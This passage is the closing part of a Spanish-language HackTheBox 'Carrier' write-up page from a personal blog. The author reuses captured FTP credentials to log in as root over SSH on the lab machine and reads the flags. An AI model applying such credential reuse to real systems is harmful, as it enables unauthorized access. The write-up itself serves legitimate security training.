+<p>SIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIiiiiiiiiiiiialksdfjlkañjsdlfkñjklasjdglkk</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155google_gif_muppetexcited.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;" /></p>
+
+<p>¡Que belleza esto POR FA VOOOOOOOOOOOOOOOOOOOR! Brutal…</p>
+
+<p>Bueno, tenemos unas credenciales de un usuario llamado <code>root</code> en su conexión contra el servidor <strong>FTP</strong>, pueeeeeeeeeeeeeeees, hagamos reutilización de contraseñas y probémoslas contra el servicio <code>SSH</code> y el usuario <strong>root</strong>:</p>
+
+<pre><code class="language-bash">❱ ssh root@10.10.10.105
+root@10.10.10.105's password:
+...
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155bash_ssh_rootSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>TAMOO compai’, estamos en el sistema como el usuario <strong>root</strong>, en el trafico <code>FTP</code> vimos algo sobre un archivo llamado <code>secretdata.txt</code>, pero el contenido es el hash de la flag <code>user.txt</code>, así que no nos preocupamos por el.</p>
+
+<p>Veamos las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/carrier/155flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Po hemo teminao’</p>
+
+<p>…</p>
+
+<p>Muy divertida esta máquina, locura brutal el tema del <code>BGP Hijacking</code>, debo decir que las redes no son ni mi fuerte ni mi gusto, pero uff esta máquina me hizo como olvidarme de esto y disfrutar un mónton el proceso.</p>
+
+<p>Increible esto ⛲</p>
+
+<p>Y bueno, nos leeremos despues, muchas gracias por todo &lt;3 YYYYYYY a seguir rompiendo todo!!</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Carrier&url=http://localhost:4000/htb/carrier" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#BGP-hijacking">BGP-hijacking</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#FTP">FTP</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#SNMP">SNMP</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#command-injection">command-injection</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#quagga">quagga</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#router">router</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/pit">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/pit/346banner.png" alt="HackTheBox - Pit"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/pit">HackTheBox - Pit</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux (CentOS 8) nivel medio. Caminaremos con el servicio SNMP, extraeremos rutas web, rutas de binarios y usuarios. Explotaremos SeedDMS con un exploit que no debería servir contra esa...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">25 Sep 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/access">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/access/156banner.png" alt="HackTheBox - Access"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/access">HackTheBox - Access</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel fácil, vamos a movernos con FTP, jugaremos con info de tablas de una base de datos Microsoft Access, comprimidos con contraseñas y correos (u.u) yyyy toquetearemos una...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">14 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/scriptkiddie">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/scriptkiddie/314banner.png" alt="HackTheBox - ScriptKiddie"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/scriptkiddie">HackTheBox - ScriptKiddie</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil. Un servidor web que ejecuta comandos específicos, pero que con uno de ellos podemos agregar un “template”, ¿qué puede salir mal? Inspeccionaremos un script al detalle...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">05 Jun 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
